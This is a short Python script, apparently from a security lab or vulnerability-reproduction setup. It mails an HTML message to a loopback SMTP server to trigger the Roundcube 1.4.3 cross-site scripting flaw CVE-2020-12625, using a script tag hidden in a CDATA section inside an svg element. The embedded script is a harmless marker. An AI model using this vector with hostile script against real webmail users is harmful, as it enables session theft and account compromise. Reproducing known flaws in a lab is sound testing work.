#!/usr/bin/env python3
"""Ca C — send the XSS fixture email into the lab mailbox (loopback only).

The HTML part carries the CVE-2020-12625 vector: a CDATA section inside an
allowed <svg> element. On Roundcube 1.4.3 rcube_washtml emits CDATA content
unescaped, so the embedded <script> reaches the browser; 1.4.4 htmlspecialchars()s
it. Run from the lab VM (SMTP on 127.0.0.1:3025) or through the SSH tunnel.
"""
import smtplib
import sys
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 3025

PAYLOAD = (
    "<html><body><p>RQ-C1 benign text</p>"
    "<svg><![CDATA[<script>window.__rqC1Xss='EXECUTED';"
    "console.log('RQ-C1-XSS-EXECUTED');</script>]]></svg>"
    "</body></html>"
)

m = MIMEMultipart("alternative")
m["Subject"] = "RQ-C1 HTML test message"
m["From"] = "test@localhost"
m["To"] = "test@localhost"
m.attach(MIMEText("RQ-C1 plain text alternative", "plain"))
m.attach(MIMEText(PAYLOAD, "html"))

s = smtplib.SMTP(HOST, PORT, timeout=10)
s.sendmail("test@localhost", ["test@localhost"], m.as_string())
s.quit()
print(f"sent payload email via {HOST}:{PORT}")
